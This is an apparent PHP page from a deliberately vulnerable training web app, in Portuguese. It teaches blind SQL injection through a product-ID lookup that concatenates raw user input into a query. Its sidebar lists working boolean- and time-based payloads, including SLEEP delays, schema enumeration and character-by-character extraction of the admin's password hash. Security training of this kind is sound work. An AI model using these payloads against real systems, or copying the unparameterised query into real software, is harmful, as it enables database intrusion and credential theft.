<?php
defined('APP') or die('Access denied');
include("db.php");
?>

<div class="container mt-4">
    <h3>🕵️ SQL Injection - Blind Method</h3>

    <div class="alert alert-warning" role="alert">
        <strong>⚠️ Aviso:</strong> Esta página contém vulnerabilidades de Blind SQL Injection para fins educacionais!
    </div>

    <div class="row">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">
                    <h5>Verificação de Produto</h5>
                </div>
                <div class="card-body">
                    <p>Informe um ID de produto para verificar se existe no sistema:</p>

                    <form action="?page=sql-injection-blind" method="post" class="mb-3">
                        <div class="input-group">
                            <span class="input-group-text">Product ID:</span>
                            <input type="text" name="product_id" id="product_id" class="form-control" placeholder="Digite um ID ou payload Blind SQLi..." value="<?php echo isset($_POST['product_id']) ? htmlspecialchars($_POST['product_id']) : ''; ?>">
                            <button type="submit" class="btn btn-primary">🔍 Verificar</button>
                        </div>
                    </form>

                    <h6>Exemplos Rápidos:</h6>
                    <div class="d-grid gap-2 d-md-block mb-3">
                        <button class="btn btn-outline-success btn-sm" onclick="setProductId('1')">📦 Produto Válido (ID=1)</button>
                        <button class="btn btn-outline-warning btn-sm" onclick="setProductId('999')">❌ Produto Inexistente</button>
                        <button class="btn btn-outline-info btn-sm" onclick="setProductId('1 AND 1=1')">✅ Boolean True</button>
                        <button class="btn btn-outline-danger btn-sm" onclick="setProductId('1 AND 1=2')">❌ Boolean False</button>
                    </div>
                </div>
            </div>

            <?php
            if (isset($_POST['product_id'])) {
                $product_id = $_POST['product_id'];

                // Vulnerable query - permite blind SQL injection
                $query = "SELECT COUNT(*) as total FROM product WHERE id = $product_id";

                echo "<div class='card mt-3'>";
                echo "<div class='card-header'>";
                echo "<h6>📊 Resultado da Verificação</h6>";
                echo "<small class='text-muted'>Query executada: <code>" . htmlspecialchars($query) . "</code></small>";
                echo "</div>";
                echo "<div class='card-body'>";

                // Measure query time for time-based detection
                $start_time = microtime(true);
                $result = $mysqli->query($query);
                $end_time = microtime(true);
                $execution_time = round(($end_time - $start_time) * 1000, 2);

                if ($result) {
                    $row = $result->fetch_assoc();
                    $count = $row['total'];

                    echo "<div class='row'>";
                    echo "<div class='col-md-8'>";

                    if ($count > 0) {
                        echo "<div class='alert alert-success' role='alert'>";
                        echo "<strong>✅ Produto encontrado!</strong><br>";
                        echo "Existem <strong>$count</strong> produto(s) com este critério.";
                        echo "</div>";
                    } else {
                        echo "<div class='alert alert-warning' role='alert'>";
                        echo "<strong>❌ Produto não encontrado</strong><br>";
                        echo "Nenhum produto encontrado com este critério.";
                        echo "</div>";
                    }

                    echo "</div>";
                    echo "<div class='col-md-4'>";
                    echo "<div class='card border-info'>";
                    echo "<div class='card-body text-center'>";
                    echo "<h6 class='card-title'>⏱️ Tempo de Execução</h6>";
                    echo "<h4 class='text-info'>{$execution_time} ms</h4>";
                    if ($execution_time > 3000) {
                        echo "<small class='text-danger'>Possível Time-based SQLi detectado!</small>";
                    }
                    echo "</div>";
                    echo "</div>";
                    echo "</div>";
                    echo "</div>";

                    $result->free_result();
                } else {
                    echo "<div class='alert alert-danger' role='alert'>";
                    echo "<strong>💥 Erro na consulta SQL:</strong><br>";
                    echo "<code>" . htmlspecialchars($mysqli->error) . "</code>";
                    echo "</div>";
                }

                echo "</div>";
                echo "</div>";
            }
            ?>
        </div>

        <div class="col-md-4">
            <div class="card">
                <div class="card-header">
                    <h6>💡 Blind SQL Injection Examples</h6>
                </div>
                <div class="card-body">
                    <div class="accordion" id="blindExamples">
            <div class="accordion-item">
                <h2 class="accordion-header" id="headingOne">
                    <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#collapseOne">
                        Boolean-based Blind SQLi
                    </button>
                </h2>
                <div id="collapseOne" class="accordion-collapse collapse show" data-bs-parent="#blindExamples">
                    <div class="accordion-body">
                        <strong>Teste de existência de dados:</strong><br>
                        <code>1 AND (SELECT COUNT(*) FROM user) > 0</code><br><br>

                        <strong>Teste de comprimento de string:</strong><br>
                        <code>1 AND (SELECT LENGTH(username) FROM user WHERE id=1) = 5</code><br><br>

                        <strong>Extração character por character:</strong><br>
                        <code>1 AND (SELECT SUBSTRING(username,1,1) FROM user WHERE id=1) = 'a'</code>
                    </div>
                </div>
            </div>

            <div class="accordion-item">
                <h2 class="accordion-header" id="headingTwo">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseTwo">
                        Time-based Blind SQLi
                    </button>
                </h2>
                <div id="collapseTwo" class="accordion-collapse collapse" data-bs-parent="#blindExamples">
                    <div class="accordion-body">
                        <strong>Teste básico de delay:</strong><br>
                        <code>1 AND SLEEP(5)</code><br><br>

                        <strong>Condição com delay:</strong><br>
                        <code>1 AND IF((SELECT COUNT(*) FROM user) > 2, SLEEP(5), 0)</code><br><br>

                        <strong>Extração com delay:</strong><br>
                        <code>1 AND IF((SELECT SUBSTRING(database(),1,1) = 'w'), SLEEP(3), 0)</code>
                    </div>
                </div>
            </div>

            <div class="accordion-item">
                <h2 class="accordion-header" id="headingThree">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapseThree">
                        Testes de Descoberta
                    </button>
                </h2>
                <div id="collapseThree" class="accordion-collapse collapse" data-bs-parent="#blindExamples">
                    <div class="accordion-body">
                        <strong>Descobrir nome do banco:</strong><br>
                        <code>1 AND (SELECT SUBSTRING(database(),1,1)) = 'w'</code><br><br>

                        <strong>Contar tabelas:</strong><br>
                        <code>1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 5</code><br><br>

                        <strong>Descobrir nome de tabela:</strong><br>
                        <code>1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'user'</code>
                    </div>
                </div>
            </div>

            <div class="accordion-item">
                <h2 class="accordion-header" id="headingPassword">
                    <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#collapsePassword">
                        Extração de Senhas
                    </button>
                </h2>
                <div id="collapsePassword" class="accordion-collapse collapse" data-bs-parent="#blindExamples">
                    <div class="accordion-body">
                        <strong>Primeiro caractere da senha do admin:</strong><br>
                        <code>1 AND (SELECT SUBSTR(password,1,1) FROM user WHERE username='admin') = '4'</code><br><br>

                        <strong>Segundo caractere da senha do admin:</strong><br>
                        <code>1 AND (SELECT SUBSTR(password,2,1) FROM user WHERE username='admin') = '8'</code><br><br>

                        <strong>Terceiro caractere da senha do admin:</strong><br>
                        <code>1 AND (SELECT SUBSTR(password,3,1) FROM user WHERE username='admin') = '2'</code><br><br>

                        <strong>Quarto caractere da senha do admin:</strong><br>
                        <code>1 AND (SELECT SUBSTR(password,4,1) FROM user WHERE username='admin') = 'c'</code><br><br>

                        <strong>Primeiros 4 caracteres (método combinado):</strong><br>
                        <code>1 AND (SELECT SUBSTR(password,1,4) FROM user WHERE username='admin') = '482c'</code><br><br>

                        <strong>Comprimento da senha:</strong><br>
                        <code>1 AND (SELECT LENGTH(password) FROM user WHERE username='admin') = 32</code><br><br>

                        <small class="text-muted">💡 <strong>Dica:</strong> Senhas estão em MD5 (32 chars). Teste caracteres: 0-9, a-f</small>
                    </div>
                </div>
            </div>
        </div>

                    <div class="mt-3">
                        <h6>💡 Dicas para Blind SQLi:</h6>
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item">• Observe diferenças nas respostas (True/False)</li>
                            <li class="list-group-item">• Teste delays para time-based injection</li>
                            <li class="list-group-item">• Use técnicas de bissecção para otimizar</li>
                            <li class="list-group-item">• Automatize com scripts para extrações longas</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
function setProductId(value) {
    document.getElementById('product_id').value = value;
}
</script>

<?php
if (isset($_POST['product_id'])) {
    $mysqli->close();
}
?>